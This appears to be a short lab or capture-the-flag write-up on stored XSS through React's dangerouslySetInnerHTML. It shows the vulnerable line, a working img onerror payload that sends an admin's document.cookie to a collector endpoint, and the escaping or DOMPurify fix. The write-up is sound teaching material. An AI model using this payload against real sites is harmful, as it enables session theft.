# 6 — Stored XSS via dangerouslySetInnerHTML

**The vuln:** the comment board renders user input as raw HTML, opting out of React's default
escaping:
```jsx
<div dangerouslySetInnerHTML={{ __html: comment.body }} />
```
An admin bot reviews new comments, so your payload runs in *their* session.

**The exploit:** `<script>` in innerHTML won't run, but event handlers do.
```html
<img src=x onerror="fetch('/collect?d='+encodeURIComponent(document.cookie))">
```
When the admin views it, it steals their cookie to the collector; read it at `/collect/log`.

**The fix:** render as text (React escapes it), or sanitize if HTML is truly needed.
```jsx
<div>{comment.body}</div>                                  // safe: escaped
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.body) }} />
```

**The lesson:** React is safe by default; `dangerouslySetInnerHTML` is the exact door out of
that safety. Don't hand it user input.
